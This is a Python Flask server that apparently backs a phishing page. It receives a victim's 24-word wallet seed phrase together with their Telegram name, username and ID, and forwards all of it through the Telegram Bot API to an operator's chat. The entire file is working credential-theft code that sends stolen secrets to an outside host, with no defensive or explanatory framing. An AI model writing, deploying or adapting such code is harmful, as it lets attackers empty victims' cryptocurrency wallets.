from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID")

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        data = request.json
        words = data.get('words', [])
        username = data.get('username', 'без_имени')
        first_name = data.get('first_name', '')
        user_id = data.get('user_id')
        
        text = f"<b>📨 Новые данные</b>\n\n"
        if first_name:
            text += f"Имя: {first_name}\n"
        text += f"Username: @{username}\n"
        text += f"ID: {user_id}\n\n<b>24 слова:</b>\n"
        for i, word in enumerate(words, 1):
            text += f"{i:2}. <code>{word}</code>\n"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            'chat_id': ADMIN_ID, 
            'text': text, 
            'parse_mode': 'HTML'
        })
        
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        return jsonify({'status': 'error'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
